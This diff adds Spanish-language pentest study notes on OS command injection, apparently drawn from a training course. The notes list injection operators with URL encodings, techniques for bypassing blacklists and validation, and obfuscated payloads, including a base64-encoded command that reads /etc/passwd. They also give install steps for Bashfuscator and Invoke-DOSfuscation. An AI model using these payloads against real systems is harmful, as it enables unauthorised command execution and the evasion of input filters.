@@ -1,0 +1,100 @@
+	#### Command injections
+Consta de poder ejecutar comandos, agregarselos, a una funcionalidad que no esta diseñada para que ejecute comandos y poder tener acceso al sistema.
+Esto se da por una falta de validacion en el input del usuario generando que todo lo que se le pase sea ejecutado por mas que haya un '...;whoami'.
+Existen:
+-> OS command injection
+-> Code injection
+-> SQL injection (ver txt propio)
+-> XSS/HTML injection (ver txt propio)
+
+### Operadores
+La aplicacion web debe tener una funcionalidad que nos permita ingresar un input para poder aprovecharlo. De esta forma, si agregamos alguno de los str siguientes podriamos agregar un comando
+OPERADOR	STR	URL-encode	Comando que ejecuta
+Semicolon	;	%3b		Both
+New Line	\n	%0a		Both
+Background	&	%26		Both (second output generally shown first)
+Pipe		|	%7c		Both (only second output is shown) -> Output limpio sin el primer comando
+AND		&&	%26%26		Both (only if first succeeds)
+OR		||	%7c%7c		Second (only if first fails) -> En el caso de que podamos hacer fallar el primer comando, nos traeria un output mas limpio
+Sub-Shell	``	%60%60		Both (Linux-only)
+Sub-Shell	$()	%24%28%29	Both (Linux-only)
+
+Mas info y otros operadores es: https://academy.hackthebox.com/module/109/section/1034
+
+### Front-end validation
+Las validaciones para evitar los input malintencionados o erroneos de los usuarios puede estar en diferentes lados
+
+## Bypassing Front-end validation
+La validacion en el front-end se hace en el cliente, esta dentro del html de la web. Esta validacion es simple de saltearsela mediante un proxy. En este, podriamos intentar agregar cualquiera de los strings de mas arriba seguido de un comando para intentar bypasear esto y que el comando sea interpretado por el sistema.
+
+### Bypassing blacklist
+Estas listas poseen los caracteres que no deben ser admitidos. El problema aca puede surgir en la no consideracion de alguno, de esta forma es una buena opcion fuzzear entre los diferentes operadores para ver cual es aceptado y cual no.
+Se puede usar burp intruder.
+
+Agregar espacios: 
+${IFS} (Variavle de env en linux) -> Funciona solo en linux
+{ls,-la} (Brace expresion) -> Funciona solo en linu
+%09 (tab)
+
+Agregar barras (/):
+${PATH:0:1} -> Funciona solo en linux
+%HOMEPATH:~6,-11% -> Funciona solo en windows CMD
+$env:HOMEPATH[0] -> Funciona solo en windows PS
+
+Agregar ;:
+${LS_COLORS:10:1} -> Funciona solo en linux
+
+Como se ve, cada uno de lo dde arriba se agrega usando diferente outpu. En el caso de PATH de windows, se toma el inddicer 0 con longitud de strings 1 para poder obtener /
+Por ejemplo, un payload resultante para leer /home usando el operador \n y tab seria: %0a%09{ls,-la}${IFS}${PATH:0:1}home
+
+## Bypassing blacklisted commands
+Ademas del blacklist de operadores, puede haber un blacklist de comandos generando que los tipicos como 'id', whoami', 'cat', etc no puedad ejecutarse
+
+	Linux y windows
+' y "
+#Son strs usalmente ignorados por bash y ps, generando que el agregado de estos bypasee la blacklist pero la shell continue interpretando el comando original.
+# De esta forma quedaria wh'oa'mi por ejemplo
+
+	Linux
+$@ o \
+#Son interpretados correctamente y permite bypasear la blacklist
+
+	Windows
+^
+#Es interpretado correctamente y bypasea la blacklist
+
+### Command obfuscation
+## Case manipulation
+CMD y PS no son keysensitive, generando que se pueda usar: whOami, WHOAMI, etc
+Linux es keysensitive, por lo cual debe utilizarse: (tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi"), (a="WhOaMi";printf %s "${a,,}")
+
+## Reverse commands
+	Linux
+(rev<<<'imaohw')
+#Esto puede probarse ejecutando echo 'whoami' | rev -> Nos devuelve la cadena dada vuelta, con el comando $(rev<<<'imaohw') se nos muestra nuestro nombre de usuario
+
+	Windows
+iex "$('imaohw'[-1..-20] -join '')"
+#Sucede lo mismo que en Linux. Para probarlo se hace con: "whoami"[-1..-20] -join '' -> Lo que nos devuelve la cadena al reves, con el comando iex "$('imaohw'[-1..-20] -join '')" se nos mmuestra el usuario.
+
+## Encode commands
+	Linux
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+#Mismo concepto que reverse. Se genera el comando en basae64 (echo 'COMMAND' | base64) y se le pasa con la flag -d para decodearlo
+
+	Windows
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+#Es igual que linux pero con otra sintaxis. Se encodea ( [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('COMMAND')) ) y se le pasa el comando de arriba para decodearlo
+
+### Evasion tools
+## Bashfuscator -> LINUX
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+python3 setup.py install --user
+
+## DOSfuscation -> WINDOWS
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+
